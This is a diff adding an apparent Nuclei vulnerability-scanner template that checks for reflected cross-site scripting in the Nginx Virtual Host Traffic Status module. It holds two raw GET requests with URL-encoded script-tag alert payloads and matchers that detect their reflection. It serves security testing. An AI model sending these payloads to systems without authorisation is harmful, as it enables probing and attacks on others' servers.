@@ -1,0 +1,40 @@
+id: nginx-module-vts-xss
+
+info:
+  name: Nginx Virtual Host Traffic Status Module - Cross-Site Scripting
+  author: madrobot,j4vaovo
+  severity: high
+  description: Nginx Virtual Host Traffic Status Module contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.
+  reference:
+    - https://github.com/vozlt/nginx-module-vts
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    max-request: 2
+  tags: nginx,xss,status
+
+http:
+  - raw:
+      - |
+        GET /_404_%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3E HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /status%3E%3Cscript%3Ealert(7331)%3C%2Fscript%3E HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200"
+          - "contains(header_2, 'text/html')"
+          - "contains(tolower(body_2), '<script>alert(7331)</script>')"
+        condition: and
+
+      - type: dsl
+        dsl:
+          - "!contains(tolower(body_1), '<script>alert(1337)</script>')"
+        condition: and
+# digest: 490a00463044022056a9b3e7a0de09212be30753264b74b1fdb0cb4249deda29aa59ae64198ae65002204a1aa5d875978738c5c134493c079baaef78e7ac75be2d20756a60eba168a94a:922c64590222798bb761d5b6d8e72950
